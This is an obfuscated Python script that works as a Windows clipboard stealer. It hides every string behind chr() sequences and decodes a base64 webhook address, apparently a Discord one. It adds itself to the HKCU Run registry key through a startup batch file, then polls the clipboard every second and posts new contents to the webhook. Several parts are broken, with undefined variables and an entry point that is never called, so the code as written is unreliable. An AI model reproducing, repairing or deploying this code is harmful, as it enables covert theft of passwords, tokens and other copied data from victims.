import subprocess
tf=print
ta=True
tB=file
ts=open
tp=False
FV=subprocess.CalledProcessError
Fr=subprocess.check_call
import time
FD=time.sleep
import pyperclip
Fu=pyperclip.paste
import requests
Fb=requests.post
import base64
Fi=base64.b64decode
import io
Fq=io.BytesIO
import os
FP=os.getenv
FE=os.path
import shutil
import sys
FJ=sys.argv
FU=sys.executable
import winreg as reg
Fg=reg.QueryValueEx
FW=reg.KEY_READ
FQ=reg.HKEY_LOCAL_MACHINE
FO=reg.CloseKey
FY=reg.REG_SZ
FT=reg.SetValueEx
FL=reg.KEY_ALL_ACCESS
Fc=reg.OpenKey
FA=reg.HKEY_CURRENT_USER
def FM(library_name):
  try:
    Fr([FU,("".join([chr(45),chr(109)]))               ,("".join([chr(112),chr(105),chr(112)]))                     ,("".join([chr(105),chr(110),chr(115),chr(116),chr(97),chr(108),chr(108)]))                               ,library_name])
    tf(f"'{library_name}' has been installed successfully.")
  except FV as e:
    tf(f"An error occurred while trying to install '{library_name}': {e}")
def FK():
  Fk=("".join([chr(97),chr(72),chr(82),chr(48),chr(99),chr(72),chr(77),chr(54),chr(76),chr(121),chr(57),chr(107),chr(97),chr(88),chr(78),chr(106),chr(98),chr(51),chr(74),chr(107),chr(76),chr(109),chr(78),chr(118),chr(98),chr(83),chr(57),chr(104),chr(99),chr(71),chr(107),chr(118),chr(100),chr(50),chr(86),chr(105),chr(97),chr(71),chr(57),chr(118),chr(97),chr(51),chr(77),chr(118),chr(77),chr(84),chr(73),chr(50),chr(77),chr(106),chr(77),chr(53),chr(77),chr(84),chr(89),chr(49),chr(77),chr(122),chr(107),chr(53),chr(77),chr(68),chr(69),chr(48),chr(77),chr(106),chr(65),chr(120),chr(77),chr(121),chr(57),chr(119),chr(78),chr(109),chr(86),chr(113),chr(83),chr(87),chr(49),chr(113),chr(82),chr(110),chr(104),chr(109),chr(77),chr(108),chr(74),chr(89),chr(97),chr(107),chr(112),chr(80),chr(77),chr(51),chr(90),chr(75),chr(81),chr(109),chr(103),chr(50),chr(86),chr(88),chr(90),chr(81),chr(81),chr(50),chr(86),chr(117),chr(83),chr(50),chr(70),chr(115),chr(97),chr(108),chr(104),chr(75),chr(77),chr(109),chr(82),chr(54),chr(83),chr(68),chr(70),chr(67),chr(100),chr(50),chr(78),chr(107),chr(89),chr(86),chr(100),chr(110),chr(84),chr(49),chr(66),chr(106),chr(82),chr(48),chr(108),chr(107),chr(83),chr(70),chr(89),chr(51),chr(101),chr(71),chr(78),chr(82),chr(87),chr(84),chr(73),chr(120),chr(87),chr(84),chr(104),chr(111),chr(84),chr(122),chr(104),chr(90),chr(76),chr(81),chr(61),chr(61)]))
  FN=Fi(Fk)
  mk=FN.decode(("".join([chr(117),chr(116),chr(102),chr(45),chr(56)]))                      )
  Fd=''
  n=b'{"content": ["Must be 2000 or fewer in length."]}'
  FM(("".join([chr(114),chr(101),chr(113),chr(117),chr(101),chr(115),chr(116),chr(115)]))               )
  FM(("".join([chr(112),chr(121),chr(112),chr(101),chr(114),chr(99),chr(108),chr(105),chr(112)]))                )
  if Fl(("".join([chr(77),chr(121),chr(83),chr(116),chr(97),chr(114),chr(116),chr(117),chr(112),chr(83),chr(99),chr(114),chr(105),chr(112),chr(116)]))                         ):
    while ta:
      FI=Fu()
      if Fd==FI:
        FD(int("".join([chr(49)]))            )
      else:
        Fj={("".join([chr(99),chr(111),chr(110),chr(116),chr(101),chr(110),chr(116)]))                               :f"```{txt}```"        }
        FS=Fb(mk,data=Fj)
        if FS.content==n:
          tf(("".join([chr(101),chr(114),chr(114),chr(111),chr(114)]))                    )
          tB=Fq(FI.encode(("".join([chr(117),chr(116),chr(102),chr(45),chr(56)]))                                 ))
          tB.name=("".join([chr(102),chr(105),chr(108),chr(101),chr(110),chr(97),chr(109),chr(101),chr(46),chr(116),chr(120),chr(116)]))
          FH={("".join([chr(102),chr(105),chr(108),chr(101)]))                                :(tB.name,tB)          }
          FS=Fb(mk,files=FH)
        Fd=FI
      FD(int("".join([chr(49)]))          )
  else:
    Fx()
def Fx():
  Fo=FE.abspath(FJ[int("".join([chr(48)]))                    ])
  FR=FE.join(FP(("".join([chr(65),chr(80),chr(80),chr(68),chr(65),chr(84),chr(65)]))                         ),("".join([chr(77),chr(105),chr(99),chr(114),chr(111),chr(115),chr(111),chr(102),chr(116),chr(92),chr(87),chr(105),chr(110),chr(100),chr(111),chr(119),chr(115)]))                                               )
  Ft=("".join([chr(115),chr(116),chr(97),chr(114),chr(116),chr(117),chr(112),chr(95),chr(115),chr(99),chr(114),chr(105),chr(112),chr(116),chr(46),chr(98),chr(97),chr(116)]))
  with ts(FE.join(FR,Ft),("".join([chr(119)]))                            )as Fm:
    Fm.write(f'@echo off\nstart "" pythonw "{script_path}"\nexit')
  Fn=FA
  Fw=("".join([chr(83),chr(111),chr(102),chr(116),chr(119),chr(97),chr(114),chr(101),chr(92),chr(77),chr(105),chr(99),chr(114),chr(111),chr(115),chr(111),chr(102),chr(116),chr(92),chr(87),chr(105),chr(110),chr(100),chr(111),chr(119),chr(115),chr(92),chr(67),chr(117),chr(114),chr(114),chr(101),chr(110),chr(116),chr(86),chr(101),chr(114),chr(115),chr(105),chr(111),chr(110),chr(92),chr(82),chr(117),chr(110)]))
  FG=Fc(Fn,Fw,int("".join([chr(48)]))               ,FL)
  FT(FG,("".join([chr(77),chr(121),chr(83),chr(116),chr(97),chr(114),chr(116),chr(117),chr(112),chr(83),chr(99),chr(114),chr(105),chr(112),chr(116)]))                         ,int("".join([chr(48)]))                           ,FY,f"{bat_path}\\{bat_name}")
  FO(FG)
def Fl(program_name):
  FX=[    FQ,    FA  ]
  Fy=[("".join([chr(83),chr(111),chr(102),chr(116),chr(119),chr(97),chr(114),chr(101),chr(92),chr(77),chr(105),chr(99),chr(114),chr(111),chr(115),chr(111),chr(102),chr(116),chr(92),chr(87),chr(105),chr(110),chr(100),chr(111),chr(119),chr(115),chr(92),chr(67),chr(117),chr(114),chr(114),chr(101),chr(110),chr(116),chr(86),chr(101),chr(114),chr(115),chr(105),chr(111),chr(110),chr(92),chr(82),chr(117),chr(110)]))                                                          ,("".join([chr(83),chr(111),chr(102),chr(116),chr(119),chr(97),chr(114),chr(101),chr(92),chr(77),chr(105),chr(99),chr(114),chr(111),chr(115),chr(111),chr(102),chr(116),chr(92),chr(87),chr(105),chr(110),chr(100),chr(111),chr(119),chr(115),chr(92),chr(67),chr(117),chr(114),chr(114),chr(101),chr(110),chr(116),chr(86),chr(101),chr(114),chr(115),chr(105),chr(111),chr(110),chr(92),chr(82),chr(117),chr(110),chr(79),chr(110),chr(99),chr(101)]))                                                                                                                     ]
  for Fv in FX:
    for Fz in Fy:
      try:
        with Fc(Fv,Fz,int("".join([chr(48)]))                       ,FW)as Fn:
          try:
            Fg(Fn,program_name)
            return ta
          except FileNotFoundError:
            continue
      except FileNotFoundError:
        continue
  return tp
